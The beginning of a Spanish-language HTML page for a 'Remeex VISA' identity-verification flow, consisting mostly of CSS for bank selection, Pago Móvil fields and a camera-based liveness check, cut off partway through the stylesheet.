<!DOCTYPE html>
<html lang="es">
<head>
  <script src="repair.js"></script>
  <script>
    function getRecargaPage(){
      try{
        const reg=JSON.parse(localStorage.getItem('visaRegistrationCompleted')||'{}');
        return reg.useOldRecarga?'recarga3.html':'homevisa.html';
      }catch(e){return 'homevisa.html';}
    }
  </script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>REMEEX - Verificación de Identidad</title>
  <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
  <link rel="apple-touch-icon" href="visabluapple.png">
  <meta name="description" content="Remeex VISA: transferencias globales sin comisiones, rapidas y seguras."/>
  <meta name="keywords" content="remesas, transferencias internacionales, enviar dinero, VISA"/>
  <meta name="author" content="Remeex VISA"/>
  <meta name="robots" content="index, follow"/>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <script src="https://cdn.jsdelivr.net/npm/gsap@3.11.4/dist/gsap.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>

  <style>
    :root {
      /* Modern banking color palette 2025 - Consistent with recarga */
      --primary: #1a1f71;
      --primary-dark: #0c1045;
      --primary-light: #3244b6;
      --secondary: #00579f;
      --accent: #f7b600;
      --success: #00d34d;
      --danger: #ff4d4d;
      --warning: #ffad33;
      --info: #0095ff;
      --visa-blue: #1a1f71;
      --visa-blue-light: #3b4998;
      --visa-blue-dark: #0d1142;
      --visa-gold: #f7b500;
      --text-primary: #1a1f71;
      --border: #e2e8f0;
      --neutral-50: #fafbfc;
      --neutral-100: #ffffff;
      --neutral-200: #f5f7fa;
      --neutral-300: #eaecf0;
      --neutral-400: #d0d5dd;
      --neutral-500: #9da4b4;
      --neutral-600: #6e7891;
      --neutral-700: #4f5d75;
      --neutral-800: #293249;
      --neutral-900: #1a1f37;

      /* Modern gradients */
      --gradient-primary: linear-gradient(135deg, #1a1f71 0%, #3244b6 100%);
      --gradient-success: linear-gradient(135deg, #00d34d 0%, #00b84a 100%);
      --gradient-card: linear-gradient(135deg, #ffffff 0%, #f8fafc 100%);
      --gradient-overlay: linear-gradient(135deg, rgba(26, 31, 113, 0.05) 0%, rgba(50, 68, 182, 0.05) 100%);

      /* Shadows & Effects */
      --shadow-xs: 0 1px 2px rgba(16, 24, 40, 0.05);
      --shadow-sm: 0 1px 3px rgba(16, 24, 40, 0.1), 0 1px 2px rgba(16, 24, 40, 0.06);
      --shadow-md: 0 4px 6px -1px rgba(16, 24, 40, 0.1), 0 2px 4px -1px rgba(16, 24, 40, 0.06);
      --shadow-lg: 0 10px 15px -3px rgba(16, 24, 40, 0.1), 0 4px 6px -2px rgba(16, 24, 40, 0.05);
      --shadow-xl: 0 20px 25px -5px rgba(16, 24, 40, 0.1), 0 10px 10px -5px rgba(16, 24, 40, 0.04);
      --shadow-banking: 0 8px 32px rgba(26, 31, 113, 0.12);
      
      /* Border radius */
      --radius-xs: 4px;
      --radius-sm: 6px;
      --radius-md: 8px;
      --radius-lg: 12px;
      --radius-xl: 16px;
      --radius-2xl: 20px;
      --radius-full: 9999px;
      
      /* Transitions */
      --transition-fast: all 0.15s cubic-bezier(0.4, 0, 0.2, 1);
      --transition-base: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
      --transition-slow: all 0.35s cubic-bezier(0.4, 0, 0.2, 1);
      
      /* Animations */
      --animation-bounce: cubic-bezier(0.175, 0.885, 0.32, 1.275);
      --animation-smooth: cubic-bezier(0.4, 0, 0.2, 1);
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      height: 100%;
    }

    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      background: var(--neutral-200);
      color: var(--neutral-900);
      line-height: 1.6;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      overflow-x: hidden;
      font-size: 85%;
    }

    /* Header */
    .app-header {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0.75rem 1rem;
      background: var(--gradient-card);
      border-bottom: 1px solid var(--neutral-300);
      box-shadow: var(--shadow-sm);
      z-index: 1000;
      height: 60px;
      backdrop-filter: blur(10px);
    }

    .header-brand {
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }

    .header-brand img {
      height: 32px;
      width: auto;
    }

    .header-actions {
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }

    .header-action-btn {
      width: 36px;
      height: 36px;
      border-radius: var(--radius-full);
      display: flex;
      align-items: center;
      justify-content: center;
      background: var(--neutral-200);
      color: var(--neutral-700);
      border: none;
      cursor: pointer;
      transition: var(--transition-base);
      text-decoration: none;
      font-size: 1rem;
    }

    .header-action-btn:hover {
      background: var(--neutral-300);
      color: var(--neutral-900);
      transform: translateY(-1px);
    }

    /* Main Container */
    .verification-container {
      padding-top: 70px;
      padding-bottom: 2rem;
      min-height: 100vh;
      max-width: 595px;
      width: 90%;
      margin: 0 auto;
      padding-left: 1rem;
      padding-right: 1rem;
      /* Removed scaling so the layout adapts naturally on all screens */
    }

    /* ===============================================
       CORRECCIÓN CRÍTICA: Progress Steps Mejorados
       =============================================== */
    .progress-container {
      padding: 12px 20px;
      background: #ffffff;
      border-bottom: 1px solid var(--border);
      flex-shrink: 0;
    }

    .progress-bar {
      width: 100%;
      height: 6px;
      background: var(--border);
      border-radius: 12px;
      overflow: hidden;
      margin-bottom: 8px;
      position: relative;
    }

    .progress-fill {
      height: 100%;
      background: linear-gradient(90deg, var(--visa-blue), var(--visa-blue-light), var(--visa-gold));
      border-radius: 12px;
      transition: width 0.8s cubic-bezier(0.25, 0.46, 0.45, 0.94);
      width: 0%;
      position: relative;
    }

    .progress-fill::after {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
      animation: shimmer 2s infinite;
    }

    .progress-text {
      font-size: 11px;
      font-weight: 600;
      color: var(--text-primary);
      text-align: center;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .progress-percentage {
      color: var(--visa-blue);
      font-weight: 700;
    }

    /* Cards */
    .card {
      background: var(--gradient-card);
      border-radius: var(--radius-2xl);
      box-shadow: var(--shadow-banking);
      overflow: hidden;
      margin-bottom: 1.5rem;
      border: 1px solid rgba(255, 255, 255, 0.6);
      transition: transform 0.3s var(--animation-smooth), box-shadow 0.3s var(--animation-smooth);
      backdrop-filter: blur(10px);
    }

    .card:hover {
      transform: translateY(-3px);
      box-shadow: var(--shadow-xl);
    }

    .card-header {
      padding: 1.5rem;
      border-bottom: 1px solid var(--neutral-300);
      background: var(--gradient-overlay);
    }

    .card-title {
      font-size: 1.25rem;
      font-weight: 700;
      color: var(--neutral-900);
      display: flex;
      align-items: center;
      gap: 0.75rem;
      margin-bottom: 0.5rem;
    }

    .card-title i {
      color: var(--primary);
      font-size: 1.5rem;
    }

    .card-subtitle {
      font-size: 0.9rem;
      color: var(--neutral-600);
      line-height: 1.5;
    }

    .card-body {
      padding: 1.5rem;
    }

    /* Form Elements */
    .form-group {
      margin-bottom: 1.25rem;
    }

    .form-label {
      display: block;
      font-size: 0.85rem;
      font-weight: 600;
      color: var(--neutral-700);
      margin-bottom: 0.5rem;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }

    .form-label i {
      color: var(--primary);
      font-size: 1rem;
    }

    .form-control {
      width: 100%;
      height: 48px;
      padding: 0 1rem;
      border: 2px solid var(--neutral-400);
      border-radius: var(--radius-lg);
      font-size: 0.9rem;
      color: var(--neutral-900);
      background: var(--neutral-100);
      transition: var(--transition-base);
      font-family: inherit;
    }

    .form-control:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 4px rgba(26, 31, 113, 0.1);
      background: var(--neutral-50);
    }

    .form-control.success {
      border-color: var(--success);
      background: rgba(0, 211, 77, 0.05);
    }

    .form-control.error {
      border-color: var(--danger);
      background: rgba(255, 77, 77, 0.05);
    }

    .fixed-field {
      background: var(--neutral-200);
      color: var(--neutral-600);
      cursor: not-allowed;
    }

    select.form-control {
      cursor: pointer;
    }

    textarea.form-control {
      height: 100px;
      padding: 0.75rem 1rem;
      resize: vertical;
      line-height: 1.5;
    }

    .form-row {
      display: flex;
      gap: 1rem;
      flex-wrap: wrap;
    }

    .form-col {
      flex: 1;
      min-width: 250px;
    }

    .error-message {
      font-size: 0.8rem;
      color: var(--danger);
      margin-top: 0.5rem;
      display: none;
      animation: fadeIn 0.3s ease;
    }

    /* Bank Selection */
    .bank-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
      gap: 1rem;
      margin-bottom: 1.5rem;
    }

    .bank-option {
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 1rem;
      border: 2px solid var(--neutral-300);
      border-radius: var(--radius-lg);
      cursor: pointer;
      transition: var(--transition-base);
      background: var(--neutral-100);
      text-align: center;
    }

    .bank-option:hover {
      border-color: var(--primary-light);
      transform: translateY(-3px);
      box-shadow: var(--shadow-md);
    }

    .bank-option.selected {
      border-color: var(--primary);
      background: rgba(26, 31, 113, 0.05);
      box-shadow: 0 0 0 3px rgba(26, 31, 113, 0.2);
    }

    .bank-option.no-bank-option {
      border-style: dashed;
      background: rgba(26, 31, 113, 0.06);
      color: var(--primary);
    }

    .bank-option.no-bank-option:hover {
      background: rgba(26, 31, 113, 0.12);
      box-shadow: 0 10px 18px -8px rgba(26, 31, 113, 0.35);
    }

    .bank-option.no-bank-option .bank-logo {
      background: rgba(26, 31, 113, 0.1);
      border-radius: var(--radius-full);
      padding: 0.45rem;
    }

    .bank-logo {
      width: 48px;
      height: 48px;
      object-fit: contain;
      margin-bottom: 0.5rem;
      border-radius: var(--radius-sm);
    }

    .bank-name {
      font-size: 0.8rem;
      font-weight: 600;
      color: var(--neutral-700);
      line-height: 1.3;
    }

    .selected-bank-info.no-bank-mode {
      display: none;
    }

    .selected-bank-info {
      display: none;
      background: var(--gradient-overlay);
      border-radius: var(--radius-lg);
      padding: 1rem;
      margin: 1rem 0;
      border-left: 4px solid var(--primary);
    }

    .selected-bank-info.active {
      display: block;
      animation: slideUp 0.4s ease;
    }

    .selected-bank-display {
      display: flex;
      align-items: center;
      gap: 0.75rem;
      margin-bottom: 1rem;
    }

    .selected-bank-logo {
      width: 40px;
      height: 40px;
      object-fit: contain;
      border-radius: var(--radius-sm);
    }

    .selected-bank-name {
      font-weight: 600;
      color: var(--neutral-800);
      font-size: 1rem;
    }

    /* Account Type Toggle */
    .account-type-toggle {
      display: flex;
      background: var(--neutral-200);
      border-radius: var(--radius-lg);
      padding: 0.25rem;
      margin-bottom: 1rem;
    }

    .account-type-option {
      flex: 1;
      padding: 0.75rem 1rem;
      border: none;
      background: transparent;
      border-radius: var(--radius-md);
      cursor: pointer;
      transition: var(--transition-base);
      font-size: 0.85rem;
      font-weight: 600;
      color: var(--neutral-600);
    }

    .account-type-option.active {
      background: var(--primary);
      color: white;
      box-shadow: var(--shadow-sm);
    }

    /* Pago Móvil Toggle */
    .pago-movil-toggle {
      display: flex;
      align-items: center;
      gap: 0.75rem;
      padding: 1rem;
      background: var(--neutral-100);
      border-radius: var(--radius-lg);
      border: 2px solid var(--neutral-300);
      margin-bottom: 1rem;
    }

    .toggle-switch {
      position: relative;
      width: 48px;
      height: 24px;
      background: var(--neutral-400);
      border-radius: var(--radius-full);
      cursor: pointer;
      transition: var(--transition-base);
    }

    .toggle-switch.active {
      background: var(--primary);
    }

    .toggle-switch::after {
      content: '';
      position: absolute;
      width: 20px;
      height: 20px;
      background: white;
      border-radius: 50%;
      top: 2px;
      left: 2px;
      transition: var(--transition-base);
      box-shadow: var(--shadow-sm);
    }

    .toggle-switch.active::after {
      left: 26px;
    }

    .toggle-label {
      font-size: 0.9rem;
      font-weight: 600;
      color: var(--neutral-700);
    }

    .pago-movil-fields {
      display: none;
      animation: slideDown 0.4s ease;
    }

    .pago-movil-fields.active {
      display: block;
    }

    /* Buttons */
    .btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      height: 48px;
      padding: 0 1.5rem;
      font-size: 0.9rem;
      font-weight: 600;
      border-radius: var(--radius-lg);
      border: none;
      cursor: pointer;
      transition: all 0.3s var(--animation-bounce);
      text-decoration: none;
      font-family: inherit;
      position: relative;
      overflow: hidden;
      min-width: 120px;
    }

    .btn i {
      margin-right: 0.5rem;
      font-size: 1rem;
    }

    .btn-primary {
      background: var(--gradient-primary);
      color: white;
      box-shadow: var(--shadow-banking);
    }

    .btn-primary:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 25px rgba(26, 31, 113, 0.3);
    }

    .btn-outline {
      background: transparent;
      border: 2px solid var(--primary);
      color: var(--primary);
    }

    .btn-outline:hover {
      background: var(--primary);
      color: white;
      transform: translateY(-2px);
    }

    .btn-success {
      background: var(--gradient-success);
      color: white;
      box-shadow: 0 4px 12px rgba(0, 211, 77, 0.3);
    }

    .btn-success:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(0, 211, 77, 0.4);
    }

    .btn-block {
      width: 100%;
    }

    .btn:disabled {
      background: var(--neutral-400);
      color: var(--neutral-600);
      cursor: not-allowed;
      transform: none;
      box-shadow: none;
      opacity: 0.7;
    }

    /* Camera Container */
    .camera-container {
      position: relative;
      width: 100%;
      max-width: 360px;
      height: 340px;
      aspect-ratio: 1;
      margin: 0 auto 1.5rem;
      border-radius: var(--radius-2xl);
      overflow: hidden;
      background: radial-gradient(circle at 30% 30%, rgba(50, 68, 182, 0.65), rgba(13, 17, 66, 0.98));
      border: 3px solid rgba(26, 31, 113, 0.85);
      box-shadow: var(--shadow-banking);
      transition: var(--transition-slow);
    }

    .camera-video {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    .camera-overlay {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      pointer-events: none;
    }

    .face-guide {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 180px;
      height: 220px;
      border: 3px dashed rgba(255, 255, 255, 0.8);
      border-radius: 50%;
      box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.5);
    }

    .camera-instructions {
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
      background: rgba(0, 0, 0, 0.8);
      color: white;
      padding: 1rem;
      text-align: center;
      font-size: 0.85rem;
      backdrop-filter: blur(5px);
      font-weight: 500;
    }

    .camera-countdown {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 5rem;
      font-weight: 700;
      color: white;
      text-shadow: 0 0 20px rgba(0, 0, 0, 0.8);
      z-index: 10;
      opacity: 0;
      pointer-events: none;
    }

    .camera-countdown.active {
      animation: countdown 3s linear;
    }

    .camera-actions {
      max-width: 360px;
      margin: 0 auto 1.5rem;
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
    }

    .camera-actions .btn {
      box-shadow: var(--shadow-lg);
    }

    .camera-actions .btn:disabled {
      box-shadow: none;
    }

    .camera-controls {
      display: none;
    }

    .biometric-intro {
      display: flex;
      align-items: flex-start;
      gap: 1rem;
      padding: 1.1rem 1.25rem;
      background: var(--gradient-card);
      border-radius: var(--radius-xl);
      border: 1px solid var(--neutral-300);
      box-shadow: var(--shadow-sm);
      margin-bottom: 1rem;
    }

    .biometric-intro .intro-icon {
      width: 48px;
      height: 48px;
      border-radius: var(--radius-full);
      background: rgba(26, 31, 113, 0.1);
      display: flex;
      align-items: center;
      justify-content: center;
      color: var(--primary);
      font-size: 1.35rem;
      flex-shrink: 0;
    }

    .biometric-intro .intro-content h3 {
      font-size: 1.05rem;
      font-weight: 700;
      color: var(--primary);
      margin-bottom: 0.35rem;
    }

    .biometric-intro .intro-content p {
      font-size: 0.85rem;
      color: var(--neutral-600);
    }

    .intro-badges {
      display: flex;
      flex-wrap: wrap;
      gap: 0.5rem;
      margin-top: 0.75rem;
    }

    .intro-badge {
      display: inline-flex;
      align-items: center;
      gap: 0.45rem;
      padding: 0.45rem 0.75rem;
      border-radius: var(--radius-full);
      font-size: 0.75rem;
      font-weight: 600;
      letter-spacing: 0.05em;
      text-transform: uppercase;
      background: rgba(26, 31, 113, 0.08);
      color: var(--primary);
    }

    .intro-badge i {
      font-size: 0.85rem;
    }

    .intro-badge-success {
      background: rgba(0, 211, 77, 0.12);
      color: var(--success);
      border: 1px solid rgba(0, 211, 77, 0.35);
    }

    .intro-badge-info {
      background: rgba(0, 149, 255, 0.12);
      color: var(--info);
      border: 1px solid rgba(0, 149, 255, 0.25);
    }

    .liveness-brief {
      background: rgba(0, 149, 255, 0.12);
      border-left-color: var(--info);
      border: 1px solid rgba(0, 149, 255, 0.2);
      box-shadow: 0 14px 32px rgba(0, 149, 255, 0.15);
    }

    .biometric-grid {
      display: grid;
      gap: 1.5rem;
      margin-bottom: 1.5rem;
    }

    @media (min-width: 920px) {
      .biometric-grid {
        grid-template-columns: minmax(0, 1fr) minmax(0, 1fr);
        align-items: stretch;
      }
    }

    .biometric-visual {
      display: flex;
      flex-direction: column;
    }

    .biometric-toolbar {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 0.75rem;
      gap: 0.75rem;
    }

    .toolbar-btn {
      border: none;
      background: rgba(26, 31, 113, 0.12);
      color: var(--primary);
      font-weight: 600;
      border-radius: var(--radius-full);
      padding: 0.5rem 0.9rem;
      font-size: 0.85rem;
      display: inline-flex;
      align-items: center;
      gap: 0.45rem;
      cursor: pointer;
      transition: var(--transition-base);
    }

    .toolbar-btn:hover {
      transform: translateY(-1px);
      background: rgba(26, 31, 113, 0.18);
      box-shadow: 0 8px 20px rgba(26, 31, 113, 0.2);
    }

    .toolbar-btn:disabled,
    .toolbar-btn.is-disabled {
      opacity: 0.55;
      cursor: not-allowed;
      pointer-events: none;
      box-shadow: none;
    }

    .biometric-status {
      display: inline-flex;
      align-items: center;
      gap: 0.5rem;
      padding: 0.45rem 0.85rem;
      border-radius: var(--radius-full);
      font-weight: 600;
      font-size: 0.8rem;
      letter-spacing: 0.04em;
      transition: var(--transition-base);
    }

    .biometric-status .status-dot {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background: currentColor;
      box-shadow: 0 0 0 4px rgba(26, 31, 113, 0.12);
    }

    .biometric-status.status-idle {
      background: rgba(0, 149, 255, 0.12);
      color: var(--info);
    }

    .biometric-status.status-active {
      background: rgba(247, 182, 0, 0.16);
      color: var(--accent);
    }

    .biometric-status.status-processing {
      background: rgba(50, 68, 182, 0.15);
      color: var(--primary-light);
    }

    .biometric-status.status-success {
      background: rgba(0, 211, 77, 0.16);
      color: var(--success);
    }

    .camera-container.scanning {
      border-color: rgba(0, 149, 255, 0.85);
      box-shadow: 0 18px 60px rgba(0, 149, 255, 0.3);
      animation: scanningGlow 2.6s ease-in-out infinite;
    }

    .camera-container.completed {
      border-color: rgba(0, 211, 77, 0.85);
      box-shadow: 0 20px 60px rgba(0, 211, 77, 0.28);
    }

    @keyframes scanningGlow {
      0% { box-shadow: 0 18px 60px rgba(0, 149, 255, 0.3); }
      50% { box-shadow: 0 24px 70px rgba(0, 149, 255, 0.4); }
      100% { box-shadow: 0 18px 60px rgba(0, 149, 255, 0.3); }
    }

    .camera-overlay {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      pointer-events: none;
    }

    .overlay-grid {
      position: absolute;
      inset: 0;
      background-image:
        linear-gradient(rgba(255, 255, 255, 0.08) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255, 255, 255, 0.08) 1px, transparent 1px);
      background-size: 22px 22px;
      opacity: 0.25;
      mix-blend-mode: screen;
    }

    .overlay-frame {
      position: absolute;
      top: 12%;
      left: 50%;
      width: 68%;
      height: 76%;
      transform: translate(-50%, -2%);
      border: 2px solid rgba(255, 255, 255, 0.45);
      border-radius: 38% 38% 46% 46%;
      box-shadow: 0 0 25px rgba(26, 31, 113, 0.4);
      transition: var(--transition-slow);
    }

    .overlay-corners .corner {
      position: absolute;
      width: 32px;
      height: 32px;
      border-radius: 10px;
      border: 3px solid rgba(247, 182, 0, 0.95);
    }

    .overlay-corners .corner-tl { top: 18%; left: 18%; border-right: none; border-bottom: none; }
    .overlay-corners .corner-tr { top: 18%; right: 18%; border-left: none; border-bottom: none; }
    .overlay-corners .corner-bl { bottom: 18%; left: 18%; border-right: none; border-top: none; }
    .overlay-corners .corner-br { bottom: 18%; right: 18%; border-left: none; border-top: none; }

    .liveness-points .point {
      position: absolute;
      width: 16px;
      height: 16px;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.35);
      transform: translate(-50%, -50%) scale(0.75);
      opacity: 0.5;
      transition: var(--transition-base);
      box-shadow: 0 0 0 0 rgba(247, 182, 0, 0.25);
    }

    .liveness-points .point-left { top: 50%; left: 20%; }
    .liveness-points .point-right { top: 50%; left: 80%; }
    .liveness-points .point-top { top: 20%; left: 50%; }
    .liveness-points .point-bottom-left { top: 72%; left: 38%; }
    .liveness-points .point-bottom-right { top: 72%; left: 62%; }
    .liveness-points .point-center { top: 50%; left: 50%; }

    .liveness-focus-dot {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 14px;
      height: 14px;
      border-radius: 50%;
      background: rgba(0, 149, 255, 0.55);
      transform: translate(-50%, -50%);
      box-shadow: 0 0 0 8px rgba(0, 149, 255, 0.25);
      opacity: 0;
      transition: var(--transition-base);
    }

    #liveness-overlay[data-stage="frontal"] .point-center,
    #liveness-overlay[data-stage="focus"] .point-center {
      background: var(--accent);
      opacity: 1;
      transform: translate(-50%, -50%) scale(1.4);
      box-shadow: 0 0 20px rgba(247, 182, 0, 0.6);
    }

    #liveness-overlay[data-stage="turn-left"] .point-left,
    #liveness-overlay[data-stage="turn-right"] .point-right {
      background: var(--accent);
      opacity: 1;
      transform: translate(-50%, -50%) scale(1.5);
      box-shadow: 0 0 20px rgba(247, 182, 0, 0.6);
    }

    #liveness-overlay[data-stage="smile"] .point-bottom-left,
    #liveness-overlay[data-stage="smile"] .point-bottom-right {
      background: var(--success);
      opacity: 1;
      transform: translate(-50%, -50%) scale(1.35);
      box-shadow: 0 0 20px rgba(0, 211, 77, 0.6);
    }

    #liveness-overlay[data-stage="focus"] .liveness-focus-dot {
      opacity: 1;
      animation: focusPulse 1.2s ease-in-out infinite;
    }

    #liveness-overlay[data-stage="turn-left"] .overlay-frame {
      transform: translate(-55%, -2%) rotate(-4deg);
      border-color: rgba(247, 182, 0, 0.8);
    }

    #liveness-overlay[data-stage="turn-right"] .overlay-frame {
      transform: translate(-45%, -2%) rotate(4deg);
      border-color: rgba(247, 182, 0, 0.8);
    }

    #liveness-overlay[data-stage="smile"] .overlay-frame {
      border-color: rgba(0, 211, 77, 0.85);
      box-shadow: 0 0 28px rgba(0, 211, 77, 0.4);
    }

    #liveness-overlay[data-stage="focus"] .overlay-frame {
      border-color: rgba(0, 149, 255, 0.8);
      box-shadow: 0 0 28px rgba(0, 149, 255, 0.35);
    }

    #liveness-overlay[data-stage="capture"] .overlay-frame {
      border-color: rgba(0, 211, 77, 0.85);
      box-shadow: 0 0 32px rgba(0, 211, 77, 0.45);
      transform: translate(-50%, -2%) scale(1.02);
    }

    @keyframes focusPulse {
      0% { transform: translate(-50%, -50%) scale(0.85); box-shadow: 0 0 0 0 rgba(0, 149, 255, 0.25); }
      50% { transform: translate(-50%, -50%) scale(1.15); box-shadow: 0 0 0 14px rgba(0, 149, 255, 0); }
      100% { transform: translate(-50%, -50%) scale(0.85); box-shadow: 0 0 0 0 rgba(0, 149, 255, 0); }
    }

    .overlay-scan-line {
      position: absolute;
      left: 14%;
      right: 14%;
      top: 0;
      height: 2px;
      background: linear-gradient(90deg, transparent, rgba(0, 149, 255, 0.85), transparent);
      opacity: 0;
      transform: translateY(-100%);
    }

    .camera-container.scanning .overlay-scan-line {
      opacity: 1;
      animation: overlaySweep 1.8s linear infinite;
    }

    @keyframes overlaySweep {
      0% { transform: translateY(-100%); opacity: 0; }
      15% { opacity: 1; }
      50% { opacity: 0.9; }
      100% { transform: translateY(100%); opacity: 0; }
    }

    .liveness-stepper {
      margin-bottom: 1.2rem;
    }

    .liveness-active-step {
      min-height: 92px;
      display: flex;
      flex-direction: column;
      justify-content: center;
    }

    .liveness-step {
      display: flex;
      gap: 0.75rem;
      align-items: flex-start;
      padding: 0.9rem 1rem;
      background: rgba(255, 255, 255, 0.88);
      border-radius: var(--radius-xl);
      border: 1px solid rgba(26, 31, 113, 0.1);
      box-shadow: var(--shadow-xs);
      opacity: 1;
      transform: translateY(0);
      transition: opacity 0.28s var(--animation-smooth), transform 0.28s var(--animation-smooth), box-shadow var(--transition-base), border-color var(--transition-base);
    }

    .liveness-step.is-active {
      border-color: rgba(247, 182, 0, 0.7);
      background: rgba(247, 182, 0, 0.12);
      box-shadow: 0 16px 32px rgba(247, 182, 0, 0.18);
    }

    .liveness-step.is-hidden {
      opacity: 0;
      transform: translateY(12px);
      pointer-events: none;
    }

    .liveness-step .step-index {
      width: 36px;
      height: 36px;
      border-radius: 50%;
      background: rgba(26, 31, 113, 0.12);
      color: var(--primary);
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 700;
      font-size: 0.9rem;
      flex-shrink: 0;
    }

    .liveness-step.is-active .step-index {
      background: var(--accent);
      color: var(--neutral-100);
    }

    .liveness-step .step-content h4 {
      font-size: 0.92rem;
      margin-bottom: 0.2rem;
      color: var(--neutral-900);
    }

    .liveness-step .step-content p {
      font-size: 0.78rem;
      color: var(--neutral-600);
    }

    .liveness-summary {
      margin-top: 0.8rem;
      padding: 0.75rem 1rem;
      background: rgba(255, 255, 255, 0.9);
      border-radius: var(--radius-xl);
      border: 1px solid rgba(26, 31, 113, 0.08);
      box-shadow: var(--shadow-xs);
      transition: opacity 0.25s var(--animation-smooth), transform 0.25s var(--animation-smooth);
    }

    .liveness-summary.is-hidden {
      opacity: 0;
      transform: translateY(6px);
      pointer-events: none;
      height: 0;
      padding: 0 1rem;
      margin-top: 0;
      overflow: hidden;
      border: none;
      box-shadow: none;
    }

    .summary-header {
      display: flex;
      align-items: center;
      gap: 0.5rem;
      font-size: 0.78rem;
      font-weight: 700;
      letter-spacing: 0.05em;
      text-transform: uppercase;
      color: var(--neutral-600);
      margin-bottom: 0.55rem;
    }

    .summary-header i {
      color: var(--success);
    }

    .summary-items {
      display: flex;
      flex-wrap: wrap;
      gap: 0.5rem;
    }

    .summary-item {
      display: inline-flex;
      align-items: center;
      gap: 0.55rem;
      padding: 0.45rem 0.75rem;
      background: rgba(26, 31, 113, 0.08);
      border-radius: var(--radius-lg);
      color: var(--primary);
      font-size: 0.75rem;
      font-weight: 600;
      opacity: 1;
      transform: translateY(0);
      transition: opacity 0.25s var(--animation-smooth), transform 0.25s var(--animation-smooth);
    }

    .summary-item.is-hidden {
      opacity: 0;
      transform: translateY(8px);
    }

    .summary-item i {
      color: var(--success);
      font-size: 0.75rem;
    }

    .summary-index {
      width: 22px;
      height: 22px;
      border-radius: 50%;
      background: var(--neutral-100);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 0.7rem;
      font-weight: 700;
      box-shadow: var(--shadow-xs);
    }

    .summary-label {
      flex: 1;
      line-height: 1.3;
    }

    @media (max-width: 520px) {
      .liveness-active-step {
        min-height: 0;
      }

      .liveness-step {
        padding: 0.8rem 0.85rem;
      }

      .biometric-intro {
        flex-direction: column;
        padding: 1rem;
      }

      .biometric-intro .intro-icon {
        margin-bottom: 0.5rem;
      }

      .summary-items {
        gap: 0.4rem;
      }

      .summary-item {
        flex: 1 1 calc(50% - 0.4rem);
        min-width: 140px;
        justify-content: flex-start;
      }

      .summary-label {
        font-size: 0.7rem;
      }
    }

    @media (max-width: 380px) {
      .summary-item {
        flex: 1 1 100%;
        min-width: 0;
      }
    }

    .liveness-instruction {
      background: var(--gradient-card);
      border-radius: var(--radius-xl);
      padding: 1rem 1.25rem;
      box-shadow: var(--shadow-sm);
      margin-bottom: 1.2rem;
    }

    .liveness-instruction h3 {
      font-size: 1.05rem;
      color: var(--primary);
      margin-bottom: 0.45rem;
    }

    .liveness-instruction p {
      font-size: 0.85rem;
      color: var(--neutral-600);
    }

    .liveness-progress {
      display: flex;
      flex-direction: column;
      gap: 0.6rem;
      margin-bottom: 1.25rem;
    }

    .liveness-progress-track {
      width: 100%;
      height: 8px;
      border-radius: var(--radius-full);
      background: var(--neutral-300);
      overflow: hidden;
    }

    .liveness-progress-bar {
      height: 100%;
      width: 0%;
      border-radius: var(--radius-full);
      background: linear-gradient(90deg, var(--primary), var(--accent));
      transition: width 0.4s ease;
    }

    .liveness-progress-label {
      font-size: 0.78rem;
      font-weight: 700;
      letter-spacing: 0.08em;
      text-transform: uppercase;
      color: var(--neutral-600);
    }

    .liveness-actions {
      display: flex;
      flex-direction: column;
      gap: 0.8rem;
      margin-bottom: 1.25rem;
    }

    .liveness-actions .btn {
      font-weight: 700;
      letter-spacing: 0.03em;
    }

    .liveness-tips {
      list-style: none;
      display: flex;
      flex-direction: column;
      gap: 0.55rem;
      font-size: 0.8rem;
      color: var(--neutral-600);
    }

    .liveness-tips i {
      margin-right: 0.5rem;
      color: var(--primary);
    }

    .analysis-report {
      margin-top: 1.5rem;
      padding: 1.25rem;
      border-radius: var(--radius-xl);
      background: rgba(26, 31, 113, 0.05);
